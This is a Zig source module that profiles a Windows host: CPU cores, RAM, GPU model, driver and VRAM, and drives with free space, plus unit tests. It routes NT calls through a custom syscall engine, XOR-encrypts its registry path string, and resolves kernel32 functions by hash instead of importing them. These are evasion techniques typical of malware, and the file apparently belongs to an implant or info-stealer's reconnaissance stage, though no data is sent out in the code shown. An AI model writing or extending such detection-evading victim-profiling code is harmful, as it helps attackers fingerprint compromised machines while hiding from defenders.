const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const dll_loader = @import("../crypto/dll_loader.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const gpu_class_path = &hash.xorEncrypt("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}");
};

fn initUnicodeString(comptime s: []const u8, buf: *[512]u16) types.UNICODE_STRING {
    @memset(buf, 0);
    for (s, 0..) |c, i| {
        buf[i] = c;
    }
    return .{
        .Length = @as(types.USHORT, @intCast(s.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(buf)),
    };
}

fn openRegKey(comptime path: []const u8) ?types.HANDLE {
    var buf_us: [512]u16 = undefined;
    var us = initUnicodeString(path, &buf_us);
    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };
    var key_handle: types.HANDLE = undefined;
    const status = engine.NtOpenKey(&key_handle, types.KEY_QUERY_VALUE, @as(types.PVOID, @ptrCast(&oa)));
    return if (status >= 0) key_handle else null;
}

fn readRegWideString(allocator: std.mem.Allocator, key: types.HANDLE, comptime value_name: []const u8) ![]u8 {
    var buf_us: [512]u16 = undefined;
    var buf_data: [8192]u8 = undefined;

    var vn = initUnicodeString(value_name, &buf_us);
    var result_len: types.ULONG = 0;
    const status = engine.NtQueryValueKey(
        key,
        &vn,
        @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
        @as(types.PVOID, @ptrCast(&buf_data)),
        @as(types.ULONG, @intCast(buf_data.len)),
        &result_len,
    );
    if (status < 0) return error.RegistryRead;

    const kvpi: *types.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(&buf_data));
    const raw = buf_data[@offsetOf(types.KEY_VALUE_PARTIAL_INFORMATION, "Data")..][0..kvpi.DataLength];

    var utf16_len: usize = raw.len / 2;
    while (utf16_len > 0) {
        const c = std.mem.readInt(u16, raw[(utf16_len - 1) * 2 ..][0..2], .little);
        if (c != 0) break;
        utf16_len -= 1;
    }
    if (utf16_len == 0) return allocator.dupe(u8, "");

    var out = std.ArrayList(u8).init(allocator);
    errdefer out.deinit();

    for (0..utf16_len) |i| {
        const cp = std.mem.readInt(u16, raw[i * 2 ..][0..2], .little);
        if (cp < 0x80) {
            try out.append(@as(u8, @intCast(cp & 0x7F)));
        } else if (cp < 0x800) {
            try out.append(@as(u8, @intCast(0xC0 | (cp >> 6))));
            try out.append(@as(u8, @intCast(0x80 | (cp & 0x3F))));
        } else {
            try out.append(@as(u8, @intCast(0xE0 | (cp >> 12))));
            try out.append(@as(u8, @intCast(0x80 | ((cp >> 6) & 0x3F))));
            try out.append(@as(u8, @intCast(0x80 | (cp & 0x3F))));
        }
    }
    return try out.toOwnedSlice();
}

fn readRegDword(key: types.HANDLE, comptime value_name: []const u8) ?u32 {
    var buf_us: [512]u16 = undefined;
    var buf_data: [64]u8 = undefined;
    var vn = initUnicodeString(value_name, &buf_us);
    var result_len: types.ULONG = 0;
    const status = engine.NtQueryValueKey(
        key,
        &vn,
        @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
        @as(types.PVOID, @ptrCast(&buf_data)),
        @as(types.ULONG, @intCast(buf_data.len)),
        &result_len,
    );
    if (status < 0) return null;
    const kvpi: *types.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(&buf_data));
    if (kvpi.Type != 4 or kvpi.DataLength < 4) return null;
    return std.mem.readInt(u32, buf_data[@offsetOf(types.KEY_VALUE_PARTIAL_INFORMATION, "Data")..][0..4], .little);
}

fn readRegQword(key: types.HANDLE, comptime value_name: []const u8) ?u64 {
    var buf_us: [512]u16 = undefined;
    var buf_data: [64]u8 = undefined;
    var vn = initUnicodeString(value_name, &buf_us);
    var result_len: types.ULONG = 0;
    const status = engine.NtQueryValueKey(
        key,
        &vn,
        @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
        @as(types.PVOID, @ptrCast(&buf_data)),
        @as(types.ULONG, @intCast(buf_data.len)),
        &result_len,
    );
    if (status < 0) return null;
    const kvpi: *types.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(&buf_data));
    if (kvpi.Type != 11 or kvpi.DataLength < 8) return null;
    return std.mem.readInt(u64, buf_data[@offsetOf(types.KEY_VALUE_PARTIAL_INFORMATION, "Data")..][0..8], .little);
}

fn getCpuCores() ?u8 {
    var info: types.SYSTEM_BASIC_INFORMATION = undefined;
    var ret_len: types.ULONG = 0;
    const status = engine.NtQuerySystemInformation(
        @intFromEnum(types.SYSTEM_INFORMATION_CLASS.SystemBasicInformation),
        @as(types.PVOID, @ptrCast(&info)),
        @sizeOf(types.SYSTEM_BASIC_INFORMATION),
        &ret_len,
    );
    if (status < 0) return null;
    return info.NumberOfProcessors;
}

fn getTotalRamMb() ?u64 {
    var info: types.SYSTEM_BASIC_INFORMATION = undefined;
    var ret_len: types.ULONG = 0;
    const status = engine.NtQuerySystemInformation(
        @intFromEnum(types.SYSTEM_INFORMATION_CLASS.SystemBasicInformation),
        @as(types.PVOID, @ptrCast(&info)),
        @sizeOf(types.SYSTEM_BASIC_INFORMATION),
        &ret_len,
    );
    if (status < 0) return null;
    return (@as(u64, info.NumberOfPhysicalPages) * info.PageSize) / (1024 * 1024);
}

fn getGpuName(allocator: std.mem.Allocator) ![]const u8 {
    var base_path_buf: [256]u8 = undefined;
    hash.xorDecrypt(E.gpu_class_path, &base_path_buf);
    const base_path = base_path_buf[0..E.gpu_class_path.len];
    const indices = [_][]const u8{ "0000", "0001", "0002" };
    for (indices) |idx| {
        var path_buf: [256]u8 = undefined;
        const full_path = try std.fmt.bufPrint(&path_buf, "{s}\\{s}", .{ base_path, idx });
        var path_us: [512]u16 = undefined;
        var i: usize = 0;
        @memset(&path_us, 0);
        while (i < full_path.len) : (i += 1) {
            path_us[i] = full_path[i];
        }
        var us = types.UNICODE_STRING{
            .Length = @as(types.USHORT, @intCast(full_path.len * 2)),
            .MaximumLength = @as(types.USHORT, @intCast(path_us.len * 2)),
            .Buffer = @as(types.PWSTR, @ptrCast(&path_us)),
        };
        var oa = types.OBJECT_ATTRIBUTES{
            .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
            .RootDirectory = null,
            .ObjectName = &us,
            .Attributes = types.OBJ_CASE_INSENSITIVE,
            .SecurityDescriptor = null,
            .SecurityQualityOfService = null,
        };
        var sub_key: types.HANDLE = undefined;
        const st = engine.NtOpenKey(&sub_key, types.KEY_QUERY_VALUE, @as(types.PVOID, @ptrCast(&oa)));
        if (st < 0) continue;
        defer _ = engine.NtClose(sub_key);

        if (readRegWideString(allocator, sub_key, "DriverDesc")) |name| {
            return name;
        } else |_| continue;
    }
    return allocator.dupe(u8, "Unknown");
}

fn getGpuDetailed(allocator: std.mem.Allocator) ![]const u8 {
    var base_path_buf: [256]u8 = undefined;
    hash.xorDecrypt(E.gpu_class_path, &base_path_buf);
    const base_path = base_path_buf[0..E.gpu_class_path.len];
    const indices = [_][]const u8{ "0000", "0001", "0002" };
    for (indices) |idx| {
        var path_buf: [256]u8 = undefined;
        const full_path = try std.fmt.bufPrint(&path_buf, "{s}\\{s}", .{ base_path, idx });
        var path_us: [512]u16 = undefined;
        @memset(&path_us, 0);
        for (full_path, 0..) |c, k| path_us[k] = c;
        var us = types.UNICODE_STRING{
            .Length = @as(types.USHORT, @intCast(full_path.len * 2)),
            .MaximumLength = @as(types.USHORT, @intCast(path_us.len * 2)),
            .Buffer = @as(types.PWSTR, @ptrCast(&path_us)),
        };
        var oa = types.OBJECT_ATTRIBUTES{
            .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
            .RootDirectory = null,
            .ObjectName = &us,
            .Attributes = types.OBJ_CASE_INSENSITIVE,
            .SecurityDescriptor = null,
            .SecurityQualityOfService = null,
        };
        var sub_key: types.HANDLE = undefined;
        const st = engine.NtOpenKey(&sub_key, types.KEY_QUERY_VALUE, @as(types.PVOID, @ptrCast(&oa)));
        if (st < 0) continue;
        defer _ = engine.NtClose(sub_key);

        const name = readRegWideString(allocator, sub_key, "DriverDesc") catch continue;
        const ver = readRegWideString(allocator, sub_key, "DriverVersion") catch allocator.dupe(u8, "N/A") catch continue;

        const vram_bytes = readRegQword(sub_key, "HardwareInformation.qwMemorySize") orelse
            @as(u64, readRegDword(sub_key, "HardwareInformation.qwMemorySize") orelse 0);

        var result = std.ArrayList(u8).init(allocator);
        try result.writer().print("{s} | Driver: {s}", .{ name, ver });
        if (vram_bytes > 0) {
            try result.writer().print(" | VRAM: {} MB", .{vram_bytes / (1024 * 1024)});
        }
        allocator.free(name);
        allocator.free(ver);
        return try result.toOwnedSlice();
    }
    return allocator.dupe(u8, "Unknown");
}

fn getDiskInfo(allocator: std.mem.Allocator) ![]const u8 {
    const kernel32 = dll_loader.getOrLoadDll("kernel32.dll") orelse return allocator.dupe(u8, "Disks: Unavailable");
    const get_drives_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetLogicalDrives")) orelse return allocator.dupe(u8, "Disks: Unavailable");
    const get_free_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetDiskFreeSpaceExA")) orelse return allocator.dupe(u8, "Disks: Unavailable");

    const GetLogicalDrives = *const fn () callconv(.C) types.DWORD;
    const GetDiskFreeSpaceExA = *const fn (dir: ?[*:0]const u8, free_avail: ?*u64, total: *u64, total_free: ?*u64) callconv(.C) types.BOOL;

    const get_drives: GetLogicalDrives = @ptrCast(@alignCast(get_drives_fn));
    const get_free: GetDiskFreeSpaceExA = @ptrCast(@alignCast(get_free_fn));

    const drive_mask = get_drives();
    var parts = std.ArrayList(u8).init(allocator);
    errdefer parts.deinit();

    var letter: u8 = 'A';
    while (letter <= 'Z') : (letter += 1) {
        const bit: u32 = @as(u32, 1) << @as(u5, @intCast(letter - 'A'));
        if ((drive_mask & bit) == 0) continue;

        var path_buf: [4]u8 = .{ @as(u8, @intCast(letter)), ':', '\\', 0 };
        var total: u64 = 0;
        var free: u64 = 0;
        const ok = get_free(&path_buf, null, &total, &free);

        if (parts.items.len > 0) try parts.append('\n');
        if (ok and total > 0) {
            const total_gb = total / (1024 * 1024 * 1024);
            const free_gb = free / (1024 * 1024 * 1024);
            try parts.appendSlice(try std.fmt.allocPrint(parts.allocator, "{c}:\\ {d}/{d} GB", .{ letter, free_gb, total_gb }));
        } else {
            try parts.appendSlice(try std.fmt.allocPrint(parts.allocator, "{c}:\\ Present", .{letter}));
        }
    }

    if (parts.items.len == 0) try parts.appendSlice("No drives found");
    return try parts.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
    var parts = std.ArrayList(u8).init(allocator);
    errdefer parts.deinit();

    if (getCpuCores()) |cores| {
        try parts.appendSlice(try std.fmt.allocPrint(parts.allocator, "CPU: {} cores", .{cores}));
    } else {
        try parts.appendSlice("CPU: Unknown");
    }

    if (getTotalRamMb()) |ram_mb| {
        try parts.appendSlice(try std.fmt.allocPrint(parts.allocator, "\nRAM: {} MB", .{ram_mb}));
    } else {
        try parts.appendSlice("\nRAM: Unknown");
    }

    const gpu = try getGpuDetailed(allocator);
    defer allocator.free(gpu);
    try parts.appendSlice(try std.fmt.allocPrint(parts.allocator, "\nGPU: {s}", .{gpu}));

    const disk = try getDiskInfo(allocator);
    defer allocator.free(disk);
    try parts.appendSlice("\nDisk: ");
    try parts.appendSlice(disk);

    return try parts.toOwnedSlice();
}

const testing = std.testing;

test "getCpuCores returns plausible value" {
    const cores = getCpuCores();
    if (cores) |c| {
        try testing.expect(c > 0 and c <= 256);
    }
}

test "getTotalRamMb returns plausible value" {
    const ram = getTotalRamMb();
    if (ram) |r| {
        try testing.expect(r > 128);
    }
}

test "getGpuName returns string" {
    const name = try getGpuName(testing.allocator);
    defer testing.allocator.free(name);
    try testing.expect(name.len > 0);
}

test "collect returns formatted string" {
    const result = try collect(testing.allocator);
    defer testing.allocator.free(result);
    try testing.expect(result.len > 0);
    try testing.expect(std.mem.containsAtLeast(u8, result, 1, "CPU:"));
}
